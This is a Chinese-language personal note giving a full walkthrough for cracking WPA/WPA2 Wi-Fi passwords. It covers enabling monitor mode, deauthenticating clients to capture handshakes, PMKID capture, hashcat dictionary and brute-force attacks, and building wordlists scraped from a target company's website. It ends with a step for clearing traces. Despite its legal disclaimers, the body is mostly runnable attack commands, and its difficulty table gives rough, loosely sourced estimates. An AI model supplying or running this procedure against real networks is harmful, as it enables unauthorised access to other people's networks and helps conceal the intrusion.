---
tags:
  - Cybersecurity
  - 定义性
title: Wifi Cracking
created: 2025-08-16T19:52
modified:
---
[[Cybersecurity]]
# Wifi Cracking
以下是**在合法授权范围内**进行网络安全练习所需的破解Wi-Fi密码完整步骤，仅用于教育目的。所有操作必须在自有网络或明确授权的实验环境中进行：

---

### 📜 **法律与道德前提**
1. **书面授权**：仅测试自己拥有的网络
2. **隔离环境**：使用单独的路由器，物理断开外网连接
3. **禁用MAC过滤**：练习时关闭路由器的MAC地址过滤功能

---

### 🛠️ **所需工具清单**
| 工具 | 作用 | 安装命令 |
|------|------|----------|
| **Aircrack-ng套件** | 捕获&分析流量 | `sudo apt install aircrack-ng` |
| **Hashcat** | GPU加速破解 | `sudo apt install hashcat` |
| **hcxdumptool** | 提取PMKID | `sudo apt install hcxdumptool` |
| **Rockyou字典** | 密码字典 | `sudo gzip -d /usr/share/wordlists/rockyou.txt.gz` |
| **支持监听模式的网卡** | 如Alfa AWUS036ACH | [驱动安装指南](https://github.com/aircrack-ng/rtl8812au) |

---

### 🔍 **破解步骤详解**

#### **步骤1：启用监听模式**
```bash
sudo airmon-ng check kill        # 终止干扰进程
sudo airmon-ng start wlan0       # 启用监听模式
sudo iwconfig                    # 确认接口变为wlan0mon
```

#### **步骤2：扫描目标网络**
```bash
sudo airodump-ng wlan0mon
```
**记录关键信息**：
- **BSSID**：路由器的MAC地址 `(例：AA:BB:CC:DD:EE:FF)`
- **频道**：工作频道 `(例：CH 6)`
- **加密类型**：WPA2-PSK

#### **步骤3：捕获握手包**
```bash
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```
**同时新开终端触发握手**：
```bash
sudo aireplay-ng -0 4 -a AA:BB:CC:DD:EE:FF wlan0mon  # 发送解除认证包
```
**成功标志**：`右上角出现WPA handshake`

#### **步骤4：提取哈希（两种方法）**
**方法1：传统握手包**
```bash
aircrack-ng capture-01.cap -J wifi_hash  # 生成hccapx文件
```

**方法2：PMKID攻击（无需客户端）**
```bash
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool pmkid.pcapng -o hash.hc22000  # 转换格式
```

#### **步骤5：选择破解方式**
**A. 字典攻击（推荐）**
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
**优化命令**：
```bash
hashcat -m 22000 -w 4 --kernel-accel=1 --force hash.hc22000 \
/usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**B. 暴力破解（仅测试短密码）**
```bash
hashcat -m 22000 -a 3 hash.hc22000 ?d?d?d?d?d?d  # 6位数字
```

#### **步骤6：解读结果**
- **成功破解**：终端显示`Status: Cracked`
- **查看密码**：
  ```bash
  hashcat --show -m 22000 hash.hc22000
  ```
  输出格式：`HASH:密码`

#### **步骤7：验证与清理**
```bash
# 验证密码有效性
nmcli dev wifi connect "SSID名称" password "破解密码"

# 清理痕迹
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
rm capture* *.hccapx *.hc22000
```

---

### ⚠️ **关键注意事项**
1. **WPA3网络**：当前无法破解（需物理访问设备）
2. **企业级WPA**：需要Radius服务器证书
3. **字典优化技巧**：
   ```bash
   # 生成定制字典
   crunch 8 8 0123456789 -o num.dict  # 8位数字字典
   cewl https://目标公司网站 -m 6 -w company.dict  # 爬取关键词
   ```
4. **硬件要求**：
   - GPU破解速度 > CPU破解100倍
   - RTX 4090：约1,200,000 H/s
   - 集成显卡：约800 H/s

---

### 📊 **不同加密方式破解难度**
| 加密类型 | 破解难度 | 所需时间 (8字符密码) |
|----------|----------|----------------------|
| **WEP** | ⭐ | < 5分钟 |
| **WPA-PSK** | ⭐⭐ | 10分钟-24小时 |
| **WPA2-PSK** | ⭐⭐⭐ | 1小时-数周 |
| **WPA3-SAE** | ⭐⭐⭐⭐⭐ | 当前不可行 |

> 注：基于RTX 4090+Rockyou字典的估算

---

### 📚 **合法练习建议**
1. **实验环境搭建**：
   ```bash
   # 创建脆弱AP
   sudo apt install hostapd dnsmasq
   sudo hostapd -B /etc/hostapd/hostapd.conf  # 配置弱密码
   ```
2. **使用CTF平台**：
   - [HackTheBox WiFi Challenges](https://www.hackthebox.com/)
   - [TryHackMe WPA Cracking Room](https://tryhackme.com/room/wifihacking101)

所有操作必须遵守当地法律，仅用于提升防御能力。实际网络攻击将面临法律制裁。

